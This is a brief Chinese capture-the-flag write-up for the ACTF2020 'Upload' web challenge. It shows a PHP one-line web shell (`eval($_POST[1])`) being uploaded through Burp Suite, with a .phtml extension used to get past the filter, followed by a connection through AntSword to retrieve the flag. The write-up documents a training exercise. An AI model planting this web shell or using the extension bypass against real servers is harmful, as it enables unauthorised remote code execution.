## [ACTF2020 新生赛]Upload

先用bp抓包，随便上传一个图片

![image-20220713004304968](D:\Typora\note\CTF\web\集训\web-Upload.assets\image-20220713004304968.png)

然后内容改为`<?php eval($_POST[1]);?>`

再改后缀，改成php或php4都不行，最后改为phtml发现可以，这样一句话木马就上传成功了

直接蚁剑连接找flag

![image-20220713004504451](D:\Typora\note\CTF\web\集训\web-Upload.assets\image-20220713004504451.png)

